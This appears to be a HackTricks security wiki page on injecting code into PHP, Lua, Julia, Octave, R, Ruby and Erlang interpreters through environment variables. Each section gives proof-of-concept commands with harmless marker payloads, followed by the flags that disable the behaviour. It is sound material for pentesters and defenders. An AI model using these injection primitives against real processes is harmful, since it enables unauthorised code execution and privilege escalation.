# macOS Interpreter Startup Injection via Environment Variables

{{#include ../../../banners/hacktricks-training.md}}

These runtime-specific techniques use inherited environment variables to select startup configuration, preload code, or supply VM flags before the intended workload. Some variants are file-backed; Lua and Erlang also support inline-code execution.

## PHP startup configuration

### `PHPRC` / `PHP_INI_SCAN_DIR` and `auto_prepend_file`

PHP CLI and CGI read configuration on every invocation. `PHPRC` can select an attacker-readable `php.ini`, while `PHP_INI_SCAN_DIR` can redirect the directory scanned for additional `.ini` files. The `auto_prepend_file` directive makes PHP parse a file before the requested script, so this combination becomes startup code execution.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

An alternative is a directory containing an `.ini` file:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

The `-n` option ignores `php.ini`; an explicit trusted `-c` path takes precedence over `PHPRC`. Remember that a long-lived server SAPI normally reads configuration when the web server starts, whereas CLI and CGI do so per invocation.<sup>[[1]](#references)</sup>

## Lua startup code

### `LUA_INIT`

Before processing command-line options or the target script, the standalone Lua interpreter executes `LUA_INIT_<major>_<minor>` or, if the versioned variable is absent, `LUA_INIT`. A value beginning with `@` names a file; any other value is evaluated directly as Lua code. This gives both file-backed and fileless startup execution.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

The exact versioned name changes with the interpreter, for example `LUA_INIT_5_4`. `lua -E` ignores all environment variables, including startup code and Lua module paths.

## Julia startup depot

### `JULIA_DEPOT_PATH` and `startup.jl`

Julia normally executes `config/startup.jl` from its first depot at startup. `JULIA_DEPOT_PATH` controls the depot list, so pointing it to an attacker-readable tree redirects the automatically loaded startup file.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

The trailing separator is useful when the victim still needs its normal packages. `julia --startup-file=no` disables this startup file. Clear the variable before launch because it also controls package registries, environments, caches, and code-loading locations.

## GNU Octave startup files

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave executes several files containing valid Octave commands during startup. `OCTAVE_SITE_INITFILE` overrides the site-wide startup file and `OCTAVE_VERSION_INITFILE` overrides the version-specific one, allowing either variable to redirect automatic execution to an attacker-readable file.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` only skips user files such as `~/.octaverc`; it does **not** stop the site-file override above. Use `--no-site-file` for the site files or `--norc` / `-f` to disable all startup files.<sup>[[7]](#references)</sup>

## R startup profiles and package loading

### `R_PROFILE_USER` / `R_PROFILE`

At startup R sources site and user profile files containing R code. `R_PROFILE` selects the site profile and `R_PROFILE_USER` selects the user profile, allowing an inherited environment to redirect either lookup to an attacker-readable file.<sup>[[8]](#references)</sup>

```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```

`--no-init-file` skips the user profile, `--no-site-file` skips the site profile, and `--vanilla` includes both protections. R first processes environment files selected by `R_ENVIRON` and `R_ENVIRON_USER`, but those files only set variables; the profile variables are the direct arbitrary-code primitive.

### `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` and library paths

R attaches the comma-separated packages in `R_DEFAULT_PACKAGES` during startup. `Rscript` gives `R_SCRIPT_DEFAULT_PACKAGES` precedence. Combining either variable with `R_LIBS`, `R_LIBS_USER`, or `R_LIBS_SITE` can make R find and load an attacker-controlled installed package; its `.onLoad` or `.onAttach` hook executes automatically.<sup>[[8]](#references)[[9]](#references)</sup>

```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```

This needs a structurally valid installed R package, not merely a loose `.R` file. `--vanilla` does not clear direct inherited variables, so a trusted wrapper must unset or replace the default-package and library-path variables as well as disabling profile files.

## Ruby loader options

### RUBYOPT

Ruby parses supported command-line switches from the `RUBYOPT` environment variable before running a script. Ruby rejects code execution through `-e` in `RUBYOPT`, but `-I` can prepend a library-search directory and `-r` can require a library. A process that launches Ruby with attacker-controlled environment variables can therefore be made to load attacker-controlled Ruby code.<sup>[[10]](#references)</sup>

Create `/tmp/inject.rb`:

```ruby:inject.rb
puts `whoami`
```

Create a benign Ruby script such as `hello.rb`:

```ruby:hello.rb
puts 'Hello, World!'
```

Run it with a controlled `RUBYOPT` value:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

To disable this behavior, pass `--disable=rubyopt` (or `--disable-rubyopt`) **before** the script name:<sup>[[10]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

An option written after `hello.rb` is passed to the script in `ARGV`; it does not disable Ruby's earlier processing of `RUBYOPT`.<sup>[[10]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

### RUBYLIB

Instead of prepending the load directory with `-I` inside `RUBYOPT`, the separate `RUBYLIB` environment variable adds directories to Ruby's `$LOAD_PATH`. Combined with `RUBYOPT=-r<module>` it loads attacker code without needing `-I` in `RUBYOPT`:<sup>[[10]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## Erlang and Elixir VM flags

### `ERL_AFLAGS`, `ERL_FLAGS`, and `ERL_ZFLAGS`

The `erl` launcher adds `ERL_AFLAGS` to the beginning of its command line and `ERL_FLAGS` / `ERL_ZFLAGS` to the end. Because `-eval` evaluates an Erlang expression during VM initialization, these variables can provide fileless code execution before the intended workload.<sup>[[11]](#references)</sup>

```bash
ERL_AFLAGS="-noshell -eval 'file:write_file(\"/tmp/erl-aflags-executed\", <<\"ok\">>).' -s init stop" erl
```

Elixir, Mix, Phoenix and many Elixir releases ultimately start the Erlang VM and may inherit these flags. Confirm the exact release wrapper: it may rebuild or sanitize VM arguments, while some tooling explicitly supports `ERL_AFLAGS`, `ERL_ZFLAGS`, or `ELIXIR_ERL_OPTIONS`.<sup>[[12]](#references)</sup>

Unlike most file-backed techniques, the `-eval` payload needs no attacker-controlled file. A trusted wrapper should clear all three Erlang flag variables (and `ELIXIR_ERL_OPTIONS` for Elixir) before starting the runtime; do not try to allowlist individual VM flags unless the parser and ordering are fully understood.

## References

- [1] [PHP configuration file](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Lua 5.4 standalone interpreter](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Julia command-line interface: Startup file](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Julia environment variables: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [GNU Octave Startup Files](https://docs.octave.org/latest/Startup-Files.html)
- [7] [GNU Octave Command Line Options](https://docs.octave.org/latest/Command-Line-Options.html)
- [8] [Initialization at Start of an R Session](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [9] [R Installation and Administration: Add-on packages](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
- [10] [Ruby documentation - Ruby command-line options](https://ruby-doc.org/3.4/ruby/options_md.html)
- [11] [`erl` command and environment variables](https://www.erlang.org/doc/apps/erts/erl_cmd.html)
- [12] [Elixir releases and VM environment options](https://hexdocs.pm/elixir/releases.html#operating-system-scripts)

{{#include ../../../banners/hacktricks-training.md}}
